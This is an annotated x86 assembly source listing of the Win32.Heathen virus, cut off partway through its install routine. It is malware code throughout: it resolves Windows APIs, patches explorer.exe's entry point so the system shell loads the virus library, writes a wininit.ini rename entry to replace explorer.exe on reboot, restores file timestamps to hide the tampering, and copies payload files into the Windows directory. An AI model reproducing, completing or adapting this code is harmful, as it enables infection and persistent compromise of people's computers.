Win32.Heathen
; ---------------------------------------------------------------------------
; some definitions of structures

API_STRUC struc
OLE_MemoryAllocator dd ?
GetWindowsDirectoryA dd	?
CopyFileA dd ?
DeleteFileA dd ?
CreateFileA dd ?
ReadFile dd ?
WriteFile dd ?
CloseHandle dd ?
SetFilePointer dd ?
GetFileTime dd ?
SetFileTime dd ?
lstrcatA dd ?
lstrcpyA dd ?
lstrcmpA dd ?
lstrlenA dd ?
StgOpenStorage dd ?
StgCreateDocFile dd ?
CoGetMalloc dd ?
API_STRUC ends

; ---------------------------------------------------------------------------

WIN32_FIND_DATA_STRUC struc
dwFileAttributes dd ?
ftCreationTime dq ?
ftLastAccessTime dq ?
ftLastWriteTime	dq ?
nFileSizeHigh dd ?
nFileSizeLow dd	?
dwReserved0 dd ?
dwReserved1 dd ?
cFileName db 80	dup(?)
cAlternateFileName db 14 dup(?)
WIN32_FIND_DATA_STRUC ends

; ---------------------------------------------------------------------------

STATG_STRUC struc
pwcsName dd ?
type dd	?
cbSize dq ?
mtime dq ?
ctime dq ?
atime dq ?
grfMode	dd ?
grfLocksSupported dd ?
clsid db 16 dup(?)
grfStateBits dd	?
dwStgFmt dd ?
STATG_STRUC ends

; ---------------------------------------------------------------------------

DirectorySTRUC struc
DirectoryName dd ?
NextDirectorySTRUC dd ?
DirectorySTRUC ends

; ---------------------------------------------------------------------------

ILockBytes_Interface struc
QueryInterface dd ?
AddRef dd ?
Release	dd ?
ReadAt dd ?
WriteAt	dd ?
Flush dd ?
SetSize	dd ?
LockRegion dd ?
UnlockRegion dd	?
Stat dd	?
ILockBytes_Interface ends

; ---------------------------------------------------------------------------

WNDCLASS_STRUC struc
style dd ?
lpfnWndProc dd ?
cbClsExtra dd ?
cbWndExtra dd ?
hInstance dd ?
hIcon dd ?
hCursor	dd ?
hbrBackground dd ?
lpszMenuName dd	?
lpszClassName dd ?
WNDCLASS_STRUC ends

; ---------------------------------------------------------------------------

Import struc
OriginalFirstThunk dd ?
TimeDateStamp dd ?
ForwarderChain dd ?
DllName	dd ?
FirstThunk dd ?
Import ends

; ---------------------------------------------------------------------------

Section struc
Name db	8 dup(?)
VirtualSize dd ?
VirtualAddress dd ?
SizeOfRawData dd ?
PointerToRawData dd ?
PointerToRelocations dd	?
PointerToLinenumbers dd	?
NumberOfRelocations dw ?
NumberOfLinenumbers dw ?
Characteristics	dd ?
Section	ends

; ---------------------------------------------------------------------------

IMalloc_Interface struc
QueryInterface dd ?
AddRef dd ?
Release	dd ?
PreAlloc dd ?
PostAlloc dd ?
PreFree	dd ?
PostFree dd ?
PreRealloc dd ?
PostRealloc dd ?
PreGetSize dd ?
PostGetSize dd ?
PreDidAlloc dd ?
PostDidAlloc dd	?
PreHeapMinimize	dd ?
PostHeapMinimize dd ?
IMalloc_Interface ends

; ---------------------------------------------------------------------------

IStream_Interface struc
QueryInterface dd ?
AddRef dd ?
Release	dd ?
Read dd	?
Write dd ?
Seek dd	?
SetSize	dd ?
CopyTo dd ?
Commit dd ?
Revert dd ?
LockRegion dd ?
UnlockRegion dd	?
Stat dd	?
Clone dd ?
IStream_Interface ends

; ---------------------------------------------------------------------------

IStorage_Interface struc
QueryInterface dd ?
AddRef dd ?
Release	dd ?
CreateStream dd	?
OpenStream dd ?
CreateStorage dd ?
OpenStorage dd ?
CopyTo dd ?
MoveElementTo dd ?
Commit dd ?
Revert dd ?
EnumElements dd	?
DestroyElement dd ?
RenameElement dd ?
SetElementTimes	dd ?
SetClass dd ?
SetStateBits dd	?
Stat dd	?
IStorage_Interface ends


;
; File Name   : heathen.vdl
; Format      :	Portable executable (PE)
; Section 1. (virtual address 00001000)
; Virtual size			: 00002000 (   8192.)
; Section size in file		: 00001600 (   5632.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?


unicode		macro page,string,zero
  irpc c,<string>
  db '&c', page
  endm
  ifnb <zero>
  dw zero
  endif
endm

p586
  model	flat

; ---------------------------------------------------------------------------

; Segment type:	Pure code
CODE segment para public 'CODE' use32
  assume cs:CODE
  ;org 401000h
  assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; --------------- S U B	R O U T	I N E ---------------------------------------

; Virus	macro calls this routine through Callback24 API
; Attributes: bp-based frame

Callback24_code	proc near

HEATHEN_BASE= dword ptr	 8
ActiveDocument=	dword ptr  0Ch
GetProcAddress=	dword ptr  10h
KERNEL32= dword	ptr  14h
OLE32= dword ptr  18h

  push	ebp
  mov	ebp, esp
  pusha
  push	[ebp+OLE32]
  push	[ebp+KERNEL32]
  push	[ebp+GetProcAddress]
  push	[ebp+ActiveDocument]
  mov	eax, [ebp+HEATHEN_BASE]
  push	eax
  mov	ebx, eax
  add	ebx, 663h   ; EBX = raw	offset of Explorer patch code, equivalent to Virtual Address 401063h
  push	ebx
  sub	eax, 401400h ; VAdata-403000h =	RAWdata-1C00h  ==> RAWdata = VAdata - 401400h
  push	eax
  call	InstallVIRUS
  popa
  pop	ebp
  retn	14h
Callback24_code	endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

asciiz_to_unicode proc near

ASCIIZ=	dword ptr  8
UNICODE= dword ptr  0Ch

  push	ebp
  mov	ebp, esp
  pusha
  xor	eax, eax
  mov	esi, [ebp+ASCIIZ]
  mov	edi, [ebp+UNICODE]
  cld

NextCharacter:
  lodsb
  stosw		    ; convert to unicode, for use with OLE functions
  or	eax, eax
  jnz	short NextCharacter
  popa
  pop	ebp
  retn
asciiz_to_unicode endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

UpperCase proc near

ASCIIZ_String= dword ptr  8

  push	ebp
  mov	ebp, esp
  push	eax
  push	esi
  mov	esi, [ebp+ASCIIZ_String]

Next_Character:
  mov	al, [esi]
  cmp	al, 'a'
  jb	short notlowercase
  cmp	al, 'z'
  ja	short notlowercase
  sub	al, 20h	    ; convert tu uppercase
  mov	[esi], al

notlowercase:
  inc	esi
  or	al, al
  jnz	short Next_Character
  pop	esi
  pop	eax
  pop	ebp
  retn
UpperCase endp


; --------------- S U B	R O U T	I N E ---------------------------------------


Explorer_Patch_Code proc near
  pusha		    ; save registers

Library_Name:
  push	0	    ; VA address of string "Heathen.vdl"

API_Name:
  mov	eax, 0	    ; VA of LoadLibraryA API
  call	dword ptr [eax]
  popa		    ; restore registers

Old_EntryPoint:
  push	0	    ; original EntryPoint of explorer.exe
  retn
Explorer_Patch_Code endp

; ---------------------------------------------------------------------------
aHeathen_vdl_0 db 'Heathen.vdl'
  db 0
Encrypted_Text db 0A8h,0B8h,0CFh,0C8h,0DFh,0DDh,0B7h, 9Ah
  db  9Eh, 8Bh,	97h, 9Ah, 91h,0DDh,0DFh,0BCh
  db  90h, 8Fh,	86h, 8Dh, 96h, 98h, 97h, 8Bh
  db 0DFh,0D7h,0BCh,0D6h,0DFh,0CEh,0C6h,0C6h
  db 0CAh,0D2h,0CEh,0C6h,0C6h,0C6h,0DFh, 9Dh
  db  86h,0DFh,0A8h, 90h, 90h, 9Bh,0B8h, 90h
  db  9Dh, 93h,	96h, 91h,0DBh
  assume ds:nothing

; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

  public DLL_EntryPoint
DLL_EntryPoint proc near

hinstDLL= dword	ptr  8
fdwReason= dword ptr  0Ch
lpvReserved= dword ptr	10h

  push	ebp	    ; this is the EntryPoint of	Heathen.vdl library
  mov	ebp, esp
  push	[ebp+fdwReason]	; reason for calling function
  push	[ebp+hinstDLL] ; handle	of DLL module
  call	DllMain
  pop	ebp
  retn	0Ch
DLL_EntryPoint endp

; ---------------------------------------------------------------------------
  align	4

; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

GetAPIAddresses proc near

APIs= dword ptr	 8
GetProcAddress=	dword ptr  0Ch
VA2RAW=	dword ptr  10h
KERNEL32= dword	ptr  14h
OLE32= dword ptr  18h

  push	ebp
  mov	ebp, esp
  push	ebx
  push	esi
  push	edi
  mov	eax, offset aGetWindowsDirectoryA ; VirtualAddress of API name
  mov	edi, [ebp+VA2RAW] ; delta to convert VA	into RAW offset	(where its located in memory)
  mov	esi, [ebp+GetProcAddress]
  add	eax, edi
  mov	ebx, [ebp+APIs]
  push	eax	    ; API name
  push	[ebp+KERNEL32] ; module	handle
  call	esi
  mov	[ebx+API_STRUC.GetWindowsDirectoryA], eax
  mov	edx, offset aCopyFileA
  add	edx, edi
  push	edx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.CopyFileA], eax
  mov	ecx, offset DeleteFileA
  add	ecx, edi
  push	ecx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.DeleteFileA], eax
  mov	eax, offset aCreateFileA
  add	eax, edi
  push	eax	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.CreateFileA], eax
  mov	edx, offset aReadFile
  add	edx, edi
  push	edx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.ReadFile], eax
  mov	ecx, offset aWriteFile
  add	ecx, edi
  push	ecx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.WriteFile], eax
  mov	eax, offset aCloseHandle
  add	eax, edi
  push	eax	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.CloseHandle], eax
  mov	edx, offset aSetFilePointer
  add	edx, edi
  push	edx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.SetFilePointer],	eax
  mov	ecx, offset aGetFileTime
  add	ecx, edi
  push	ecx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.GetFileTime], eax
  mov	eax, offset aSetFileTime
  add	eax, edi
  push	eax	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.SetFileTime], eax
  mov	edx, offset alstrcatA
  add	edx, edi
  push	edx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.lstrcatA], eax
  mov	ecx, offset alstrcpyA
  add	ecx, edi
  push	ecx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.lstrcpyA], eax
  mov	eax, offset alstrcmpA
  add	eax, edi
  push	eax	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.lstrcmpA], eax
  mov	edx, offset alstrlenA
  add	edx, edi
  push	edx	    ; API name
  push	[ebp+KERNEL32] ; KERNEL32 base
  call	esi
  mov	[ebx+API_STRUC.lstrlenA], eax
  mov	ecx, offset aStgOpenStorage
  add	ecx, edi
  push	ecx	    ; API name
  push	[ebp+OLE32] ; OLE32 base
  call	esi
  mov	[ebx+API_STRUC.StgOpenStorage],	eax
  mov	eax, offset aStgCreateDocfile
  add	eax, edi
  push	eax	    ; API name
  push	[ebp+OLE32] ; OLE32 base
  call	esi
  mov	[ebx+API_STRUC.StgCreateDocFile], eax
  add	edi, offset aCoGetMalloc
  push	edi	    ; API name
  push	[ebp+OLE32] ; OLE32 base
  call	esi
  mov	[ebx+API_STRUC.CoGetMalloc], eax
  push	ebx	    ; store in first field of API_STRUC	a pointer to the Memory	Allocator
  push	1	    ; must be 1
  call	[ebx+API_STRUC.CoGetMalloc] ; Retrieves	a pointer to the default OLE task memory allocator
  pop	edi
  pop	esi
  pop	ebx
  pop	ebp
  retn
GetAPIAddresses	endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

PatchEXPLORER proc near

PEheader= byte ptr -120h
MZheader= byte ptr -78h
pImportDirectory= dword	ptr -38h
LoadLibraryA_present= dword ptr	-34h
reloc_section= dword ptr -30h
malloc_idata= dword ptr	-2Ch
malloc_sections= dword ptr -28h
readbytes= dword ptr -24h
WriteTime= qword ptr -20h
AccessTime= qword ptr -18h
CreationTime= qword ptr	-10h
FileHandle= dword ptr -8
error= dword ptr -4
APIs= dword ptr	 8
WINDOWS_HeathenVEX= dword ptr  0Ch
API_LoadLibraryA= dword	ptr  10h
MODULE_Kernel32= dword ptr  14h
Patch_RAWoffset= dword ptr  18h

  push	ebp
  mov	ebp, esp
  add	esp, 0FFFFFEE0h
  xor	eax, eax
  push	ebx
  push	esi
  push	edi
  mov	esi, [ebp+APIs]
  mov	[ebp+error], eax
  push	0	    ; NULL
  push	10000000h   ; FILE_FLAG_RANDOM_ACCESS (to optimize file	caching)
  push	3	    ; OPEN_EXISTING
  push	0	    ; NULL = handle cannot be inherited
  push	0	    ; 0	= prevent file from being shared
  push	0C0000000h  ; GENERIC_READ + GENERIC_WRITE
  push	[ebp+WINDOWS_HeathenVEX]
  call	[esi+API_STRUC.CreateFileA] ; open file
  mov	[ebp+FileHandle], eax ;	file handle
  lea	edx, [ebp+WriteTime]
  push	edx
  lea	ecx, [ebp+AccessTime]
  push	ecx
  lea	eax, [ebp+CreationTime]
  push	eax
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.GetFileTime] ; GetFileTime
  lea	edx, [ebp+readbytes] ; actual number of	bytes read
  push	0	    ; NULL
  push	edx
  lea	ecx, [ebp+MZheader] ; buffer for MZ header
  push	40h	    ; number of	bytes to read
  push	ecx
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.ReadFile] ; read	MZ header
  push	0
  push	0
  push	dword ptr [ebp+MZheader+3Ch] ; read pointer to new executable header
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFilePointer] ; set file pointer to beginning of PE header
  lea	eax, [ebp+readbytes]
  push	0
  push	eax
  lea	edx, [ebp+PEheader]
  push	0A8h	    ; read A8h bytes of	PE header
  push	edx
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.ReadFile] ; ReadFile
  mov	ecx, dword ptr [ebp+PEheader+28h] ; entrypoint
  cmp	ecx, dword ptr [ebp+PEheader+0A0h] ; relocs start
  jnz	short error11 ;	both must be different from zero!
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.CloseHandle] ; close file
  xor	eax, eax    ; return with error
  jmp	error10
; ---------------------------------------------------------------------------

error11:
  movzx	edx, word ptr [ebp+PEheader+6] ; number	of sections
  mov	ecx, edx
  shl	ecx, 3
  lea	ecx, [ecx+ecx*4] ; ecx = size of sections
  push	ecx	    ; number of	bytes to reserve
  mov	eax, [esi]
  push	eax	    ; IMalloc
  mov	edx, [eax]
  call	[edx+IMalloc_Interface.PreAlloc] ; reserve memory for sections
  mov	[ebp+malloc_sections], eax ; pointer to	buffer of sections
  push	dword ptr [ebp+PEheader+84h] ; idata (import section) size
  mov	ecx, [esi]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IMalloc_Interface.PreAlloc] ; reserve memory for idata section
  mov	[ebp+malloc_idata], eax	; pointer to buffer of idata
  cmp	[ebp+malloc_sections], 0 ; malloc ok?
  jz	short error12
  cmp	[ebp+malloc_idata], 0 ;	malloc ok?
  jnz	short malloc_ok

error12:
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.CloseHandle] ; close file
  xor	eax, eax    ; return with error
  jmp	error10
; ---------------------------------------------------------------------------

malloc_ok:
  push	0	    ; FILE_BEGIN
  push	0	    ; high dword of file pointer
  movzx	edx, word ptr [ebp+PEheader+14h] ; NT Optional Header Size
  add	edx, dword ptr [ebp+MZheader+3Ch] ; offset of PE header
  add	edx, 18h    ; size of PE File Header
  push	edx	    ; low dword	of file	pointer
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFilePointer] ; SetFilePointer
  push	0	    ; NULL
  lea	ecx, [ebp+readbytes]
  push	ecx
  movzx	eax, word ptr [ebp+PEheader+6] ; number	of sections
  mov	edx, eax
  shl	edx, 3
  lea	edx, [edx+edx*4] ; edx = size of sections
  push	edx
  push	[ebp+malloc_sections] ;	buffer to store	info of	sections
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.ReadFile] ; read	sections table
  movzx	eax, word ptr [ebp+PEheader+6]
  dec	eax
  test	eax, eax
  jl	short found_idata

check_next_section:
  lea	edx, [eax+eax*4]
  mov	ecx, [ebp+malloc_sections]
  mov	edx, [ecx+edx*8+Section.VirtualAddress]
  cmp	edx, dword ptr [ebp+PEheader+80h]
  jle	short found_idata ; rva	inside idata
  dec	eax
  test	eax, eax
  jge	short check_next_section

found_idata:
  movzx	ecx, word ptr [ebp+PEheader+6]
  dec	ecx	    ; last section
  mov	[ebp+reloc_section], ecx
  cmp	[ebp+reloc_section], 0
  jl	short found_relocs

check_next_section2:
  mov	edx, [ebp+reloc_section]
  lea	edx, [edx+edx*4]
  mov	ecx, [ebp+malloc_sections]
  mov	edx, [ecx+edx*8+Section.VirtualAddress]
  cmp	edx, dword ptr [ebp+PEheader+0A0h] ; rva of relocs
  jle	short found_relocs ; reloc section found!
  dec	[ebp+reloc_section]
  cmp	[ebp+reloc_section], 0
  jge	short check_next_section2

found_relocs:
  push	0	    ; FILE_BEGIN
  push	0
  lea	edx, [eax+eax*4] ; EAX=idata section number
  mov	ecx, [ebp+malloc_sections]
  mov	eax, [ebp+malloc_sections]
  mov	ebx, dword ptr [ebp+PEheader+80h] ; idata RVA
  sub	ebx, [ecx+edx*8+Section.VirtualAddress]
  add	ebx, [eax+edx*8+Section.PointerToRawData]
  push	ebx	    ; RAW offset of idata
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFilePointer] ; set file pointer to beginning of idata
  push	0	    ; NULL
  lea	edx, [ebp+readbytes]
  push	edx
  push	dword ptr [ebp+PEheader+84h] ; size of idata
  push	[ebp+malloc_idata] ; buffer to read idata info
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.ReadFile] ; read	all idata
  xor	ecx, ecx
  mov	[ebp+LoadLibraryA_present], ecx
  mov	eax, [ebp+malloc_idata]
  mov	[ebp+pImportDirectory],	eax ; actual import directory
  jmp	next_importentry2
; ---------------------------------------------------------------------------

check_importentry:
  mov	ebx, eax
  add	ebx, [ebp+malloc_idata]	; start	of idata buffer
  sub	ebx, dword ptr [ebp+PEheader+80h] ; (this is because buffer may	have not been read at start of idata section)
  push	ebx
  call	UpperCase   ; convert all to uppercase
  pop	ecx
  push	[ebp+MODULE_Kernel32] ;	KERNEL32.DLL name
  push	ebx
  call	[esi+API_STRUC.lstrcmpA] ; compare DLL name
  test	eax, eax
  jnz	short next_importentry ; not the same
  mov	eax, [ebp+pImportDirectory]
  mov	edi, [eax+Import.OriginalFirstThunk] ; EDI = RVA of import lookup table
  add	edi, [ebp+malloc_idata]
  sub	edi, dword ptr [ebp+PEheader+80h] ; EDI	= converted to RAW offset
  xor	ebx, ebx    ; EBX = 0 =	start of array
  jmp	short next_api0
; ---------------------------------------------------------------------------

more_apis:
  test	eax, eax
  jle	short next_api ; its not imported by name
  add	eax, [ebp+malloc_idata]
  sub	eax, dword ptr [ebp+PEheader+80h]
  add	eax, 2	    ; skip HINT	field
  push	[ebp+API_LoadLibraryA] ; "LoadLibraryA"
  push	eax
  call	[esi+API_STRUC.lstrcmpA] ; compare API name
  test	eax, eax
  jnz	short next_api ; not the same
  mov	eax, [ebp+pImportDirectory]
  mov	ecx, ebx
  shl	ecx, 2
  mov	edx, [eax+Import.FirstThunk] ; RVA of import address table
  mov	eax, offset API_Name+1
  add	edx, ecx    ; select corresponding RVA from array of RVAs
  sub	eax, offset Explorer_Patch_Code	; start	of bytes that will be written to explorer.exe
  add	eax, [ebp+Patch_RAWoffset] ; entrypoint	of that	routine
  add	edx, dword ptr [ebp+PEheader+34h] ; add	ImageBase
  mov	[eax], edx  ; RVA where	LoadLibraryA address will be stored
  xor	edx, edx
  mov	[ebp+LoadLibraryA_present], 1 ;	LoadLibraryA found!  :D
  mov	[edi+ebx*4+4], edx ; make next api entry NULL, so it exits quickly, because the	LoadLibrary has	already	been found! ;D
  xor	eax, eax
  mov	ecx, [ebp+pImportDirectory]
  mov	[ecx+20h], eax ; make next import entry	NULL to	exit quickly, we now have what we need	;D

next_api:
  inc	ebx

next_api0:
  mov	eax, [edi+ebx*4]
  test	eax, eax
  jnz	short more_apis	; still	more imported APIs to check

next_importentry:
  add	[ebp+pImportDirectory],	14h ; next import entry

next_importentry2:
  mov	edx, [ebp+pImportDirectory] ; actual import entry
  mov	eax, [edx+Import.DllName] ; RVA	of imported dll	name
  test	eax, eax
  jnz	check_importentry ; check these	dll imports
  cmp	[ebp+LoadLibraryA_present], 0
  jz	error13	    ; error, LoadLibraryA not imported
  mov	edx, offset aHeathen_vdl_0
  mov	ecx, offset Library_Name+1
  add	edx, dword ptr [ebp+PEheader+0A0h]
  sub	ecx, offset Explorer_Patch_Code
  add	ecx, [ebp+Patch_RAWoffset] ; ECX = location in memory that contains VA (for explorer.exe) of Library name
  sub	edx, offset Explorer_Patch_Code
  add	edx, dword ptr [ebp+PEheader+34h] ; EDX	= Virtual Address (when	executing explorer.exe)	of Library Name
  mov	eax, offset Old_EntryPoint+1
  mov	[ecx], edx  ; store that virtual address in the	patch code
  sub	eax, offset Explorer_Patch_Code
  add	eax, [ebp+Patch_RAWoffset] ; EAX = location in memory that contains VA (for explorer.exe) of its original EntryPoint
  mov	edx, dword ptr [ebp+PEheader+28h]
  add	edx, dword ptr [ebp+PEheader+34h] ; EDX	= original EntryPoint
  mov	[eax], edx  ; store old	EntryPoint in the patch	code
  push	0	    ; FILE_BEGIN
  push	0
  mov	eax, [ebp+reloc_section] ; number of the reloc section
  mov	edx, [ebp+malloc_sections] ; buffer of sections	table
  mov	ecx, dword ptr [ebp+PEheader+0A0h] ; RVA of relocs
  lea	eax, [eax+eax*4]
  sub	ecx, [edx+eax*8+Section.VirtualAddress]	; relative RVA from beginning of reloc section
  mov	edx, [ebp+malloc_sections]
  add	ecx, [edx+eax*8+Section.PointerToRawData] ; ECX	= RAW offset of	start of relocs
  push	ecx
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFilePointer] ; set file pointer to start of relocs blocks
  push	0	    ; NULL
  lea	eax, [ebp+readbytes] ; here will be returned the actual	number of bytes	written
  push	eax
  mov	ecx, offset Encrypted_Text
  sub	ecx, offset Explorer_Patch_Code	; ECX =	size of	code to	patch
  push	ecx
  push	[ebp+Patch_RAWoffset]
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.WriteFile] ; write patch	code at	beginning of relocs blocks
  mov	eax, dword ptr [ebp+PEheader+0A0h]
  mov	dword ptr [ebp+PEheader+28h], eax ; set	new EntryPoint to point	to the virus routine  ;-)
  push	0	    ; FILE_BEGIN
  push	0
  push	dword ptr [ebp+MZheader+3Ch]
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFilePointer] ; set file pointer to PEheader start
  lea	edx, [ebp+readbytes]
  push	0
  push	edx
  lea	ecx, [ebp+PEheader]
  push	0A8h	    ; size of PE header
  push	ecx
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.WriteFile] ; write PE header
  mov	[ebp+error], 1 ; indicate we have patch	explorer.exe successfully

error13:
  push	[ebp+malloc_sections]
  mov	eax, [esi]
  push	eax
  mov	edx, [eax]
  call	[edx+IMalloc_Interface.PreFree]	; free memory
  push	[ebp+malloc_idata]
  mov	ecx, [esi]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IMalloc_Interface.PreFree]	; free memory
  lea	edx, [ebp+WriteTime]
  push	edx
  lea	ecx, [ebp+AccessTime]
  push	ecx
  lea	eax, [ebp+CreationTime]
  push	eax
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.SetFileTime] ; restore file time
  push	[ebp+FileHandle]
  call	[esi+API_STRUC.CloseHandle] ; close handle
  mov	eax, [ebp+error] ; return error

error10:
  pop	edi
  pop	esi
  pop	ebx
  mov	esp, ebp
  pop	ebp
  retn
PatchEXPLORER endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

CreateWININIT proc near

String=	byte ptr -260h
BytesWritten= dword ptr	-8
Character_Equal= dword ptr -4
APIs= dword ptr	 8
WINDOWS_WininitINI= dword ptr  0Ch
WINDOWS_ExplorerEXE= dword ptr	10h
WINDOWS_HeathenVEX= dword ptr  14h
HEATHEN_BASE= dword ptr	 18h

  push	ebp
  mov	ebp, esp
  add	esp, 0FFFFFDA0h
  mov	eax, offset aRename
  lea	edx, [ebp+String]
  push	ebx
  push	esi
  add	eax, [ebp+HEATHEN_BASE]
  mov	ebx, [ebp+APIs]	; APIs array
  push	eax
  push	edx
  call	[ebx+API_STRUC.lstrcpyA] ; create section [rename]
  push	[ebp+WINDOWS_ExplorerEXE]
  lea	ecx, [ebp+String]
  push	ecx
  call	[ebx+API_STRUC.lstrcatA] ; add "c:windowsexplorer.exe"
  mov	[ebp+Character_Equal], '='
  lea	eax, [ebp+Character_Equal]
  lea	edx, [ebp+String]
  push	eax
  push	edx
  call	[ebx+API_STRUC.lstrcatA] ; add "="
  push	[ebp+WINDOWS_HeathenVEX]
  lea	ecx, [ebp+String]
  push	ecx
  call	[ebx+API_STRUC.lstrcatA] ; add "c:windowsheathen.vex"
  push	0	    ; NULL
  push	20h	    ; FILE_ATTRIBUTE_ARCHIVE
  push	2	    ; CREATE_ALWAYS
  push	0	    ; NULL = file handle cannot	be inherited
  push	0	    ; 0	= prevent file from being shared
  push	40000000h   ; GENERIC_WRITE
  push	[ebp+WINDOWS_WininitINI]
  call	[ebx+API_STRUC.CreateFileA] ; create file "c:windowswininit.ini"
  mov	esi, eax
  push	0	    ; NULL
  lea	eax, [ebp+BytesWritten]	; actual number	of bytes written
  push	eax
  lea	edx, [ebp+String]
  push	edx
  call	[ebx+API_STRUC.lstrlenA] ; get length of string	to write
  push	eax	    ; number of	bytes to write
  lea	ecx, [ebp+String]
  push	ecx	    ; buffer for write
  push	esi	    ; file handle
  call	[ebx+API_STRUC.WriteFile]
  push	esi
  call	[ebx+API_STRUC.CloseHandle] ; close file
  pop	esi
  pop	ebx
  mov	esp, ebp
  pop	ebp
  retn
CreateWININIT endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; This routine install virus in	system,	so next	reboot explorer.exe will load Heathen.vdl library
; Attributes: bp-based frame

InstallVIRUS proc near

Buffer=	byte ptr -0E28h
UNICODE_HeathenVdo= byte ptr -0C28h
UNICODE_HtmpDoc= byte ptr -9D0h
WINDOWS_WininitINI= byte ptr -778h
WINDOWS_HeathenVDO= byte ptr -64Ch
WINDOWS_HeatheVDL= byte	ptr -520h
WINDOWS_HeathenVEX= byte ptr -3F4h
WINDOWS_ExplorerEXE= byte ptr -2C8h
WINDOWS_HtmpDOC= byte ptr -19Ch
APIs= API_STRUC	ptr -70h
writtenbytes= dword ptr	-28h
FileHandle= dword ptr -24h
StreamSeek= qword ptr -20h
MacrosSize= dword ptr -18h
MacrosOffset= dword ptr	-14h
xTable=	dword ptr -10h
IStream1= dword	ptr -0Ch
IStorage2= dword ptr -8
IStorage1= dword ptr -4
VA2RAW=	dword ptr  8
Patch_code= dword ptr  0Ch
HEATHEN_BASE= dword ptr	 10h
ActiveDocument=	dword ptr  14h
GetProcAddress=	dword ptr  18h
KERNEL32= dword	ptr  1Ch
OLE32= dword ptr  20h

  push	ebp
  mov	ebp, esp
  add	esp, 0FFFFF1D8h	; suck stack! yeah!  8-P
  push	ebx
  push	esi
  push	edi
  mov	ebx, [ebp+VA2RAW]
  push	[ebp+OLE32]
  push	[ebp+KERNEL32]
  push	ebx
  push	[ebp+GetProcAddress]
  lea	eax, [ebp+APIs]	; address to store API addresses
  push	eax
  call	GetAPIAddresses	; get all APIs
  add	esp, 14h
  lea	edx, [ebp+WINDOWS_HtmpDOC]
  push	12Ch	    ; buffer size
  push	edx
  call	[ebp+APIs.GetWindowsDirectoryA]	; get windows directory, and store it in 6 buffers
  lea	ecx, [ebp+WINDOWS_HtmpDOC]
  lea	eax, [ebp+WINDOWS_ExplorerEXE]
  push	ecx
  push	eax
  call	[ebp+APIs.lstrcpyA]
  lea	edx, [ebp+WINDOWS_HtmpDOC]
  lea	ecx, [ebp+WINDOWS_HeathenVEX]
  push	edx
  push	ecx
  call	[ebp+APIs.lstrcpyA]
  lea	eax, [ebp+WINDOWS_HtmpDOC]
  lea	edx, [ebp+WINDOWS_HeatheVDL]
  push	eax
  push	edx
  call	[ebp+APIs.lstrcpyA]
  lea	ecx, [ebp+WINDOWS_HtmpDOC]
  lea	eax, [ebp+WINDOWS_HeathenVDO]
  push	ecx
  push	eax
  call	[ebp+APIs.lstrcpyA]
  lea	edx, [ebp+WINDOWS_HtmpDOC]
  lea	ecx, [ebp+WINDOWS_WininitINI]
  push	edx
  push	ecx
  call	[ebp+APIs.lstrcpyA]
  mov	eax, offset aHtmp_doc
  lea	edx, [ebp+WINDOWS_HtmpDOC]
  add	eax, ebx
  push	eax
  push	edx
  call	[ebp+APIs.lstrcatA] ; c:windowsHtmp.doc
  mov	ecx, offset aExplorer_exe
  lea	eax, [ebp+WINDOWS_ExplorerEXE]
  add	ecx, ebx
  push	ecx
  push	eax
  call	[ebp+APIs.lstrcatA] ; c:windowsExplorer.exe
  mov	edx, offset aHeathen_vex
  lea	ecx, [ebp+WINDOWS_HeathenVEX]
  add	edx, ebx
  push	edx
  push	ecx
  call	[ebp+APIs.lstrcatA] ; c:windowsHeathen.vex
  mov	eax, offset aHeathen_vdl
  lea	edx, [ebp+WINDOWS_HeatheVDL]
  add	eax, ebx
  push	eax
  push	edx
  call	[ebp+APIs.lstrcatA] ; c:windowsHeathen.vdl
  mov	ecx, offset aHeathen_vdo
